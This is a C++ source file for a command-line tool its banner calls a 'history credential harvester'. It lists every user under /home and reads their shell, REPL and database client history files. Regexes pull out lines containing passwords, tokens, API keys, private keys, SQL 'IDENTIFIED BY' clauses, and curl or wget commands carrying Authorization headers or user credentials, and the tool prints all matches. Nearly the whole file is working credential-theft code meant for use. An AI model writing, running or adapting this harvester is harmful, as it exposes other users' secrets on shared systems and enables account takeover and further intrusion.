#include <iostream>
#include <string>
#include <vector>
#include <fstream>
#include <filesystem>
#include <sstream>
#include <regex>

std::string execCommand(const std::string& cmd) {
    std::array<char, 128> buffer;
    std::string result;

    FILE* pipe = popen(cmd.c_str(), "r");
    if (!pipe) return "ERROR";

    while (fgets(buffer.data(), buffer.size(), pipe) != nullptr) {
        result += buffer.data();
    }
    pclose(pipe);
    return result;
}

std::vector<std::string> histFiles {
    "~/.bash_history",       
    "~/.zsh_history",        
    "~/.sh_history",         
    "~/.ksh_history",        
    "~/.fish_history",       
    "~/.local/share/fish/fish_history", 
    "~/.tcsh_history",       
    "~/.history",            
    "~/.python_history",     
    "~/.node_repl_history",  
    "~/.mysql_history",      
    "~/.psql_history",       
    "~/.sqlite_history",     
    "~/.mongo_history",      
    "~/.lesshst",            
    "~/.wget-hsts",          
};

std::vector<std::string> scanSensitiveHistory(const std::vector<std::string>& lines) {
    static const std::regex sensitivePattern(
        R"((password|passwd|token|secret|api_key|auth|credential|private_key|access_key)[ =:]|IDENTIFIED\s+BY|db\.auth\()",
        std::regex::icase | std::regex::ECMAScript
    );
    std::vector<std::string> matches;
    for (const auto& line : lines) {
        if (std::regex_search(line, sensitivePattern)) {
            matches.emplace_back(line);
        }
    }
    return matches;
}

std::vector<std::string> getHistory() {
    std::vector<std::string> Users;
    std::vector<std::string> histData;
    std::string cmd = "ls /home";
    std::string results = execCommand(cmd.c_str());
    std::istringstream ss(results);
    std::string username;
    while (std::getline(ss, username)) {
        if (!username.empty()) {
            Users.emplace_back(username);
        }
    }
    for (const auto& historyFiles : histFiles) {
        std::string expanded = historyFiles.substr(1);
        for (const auto& getUsers : Users) {
            std::string userHistFile = "/home/" + getUsers + expanded;
            if (std::filesystem::exists(userHistFile)) {
                std::ifstream file(userHistFile);
                std::string line;
                if (file.is_open()) {
                    while(std::getline(file, line)) {
                        histData.emplace_back(line);
                    }
                }
            }
        }
    }
    return histData;
}

std::vector<std::string> scanCurlHistory(const std::vector<std::string>& lines) {
    static const std::regex curlPattern(
        R"(curl.+(-H\s*["']?(Authorization|X-Api-Key)|--header\s*["']?Authorization|--user\s|--oauth2-bearer|-u\s)|wget.+--header=["']?Authorization)",
        std::regex::icase | std::regex::ECMAScript
    );
    std::vector<std::string> matches;
    for (const auto& line : lines) {
        if (std::regex_search(line, curlPattern)) {
            matches.emplace_back(line);
        }
    }
    return matches;
}

std::vector<std::string> runHistParser() {
    std::vector<std::string> allLines = getHistory();
    std::vector<std::string> results = scanSensitiveHistory(allLines);
    std::vector<std::string> curlHits = scanCurlHistory(allLines);
    results.insert(results.end(), curlHits.begin(), curlHits.end());
    return results;
}

int main() {
    
        std::cout << R"(
  ____      _ _                              
 |  _ \ ___| (_) __ _ _   _  __ _ _ __ _   _ 
 | |_) / _ \ | |/ _` | | | |/ _` | '__| | | |
 |  _ <  __/ | | (_| | |_| | (_| | |  | |_| |
 |_| \_\___|_|_|\__, |\__,_|\__,_|_|   \__, |
                |___/                  |___/ 
          [ history credential harvester ]
)" << "\n";
    
    std::vector<std::string> historyResults = runHistParser();
    for (const auto& hResults : historyResults) {
        std::cout << hResults << "\n";
    }
    return 0;
}







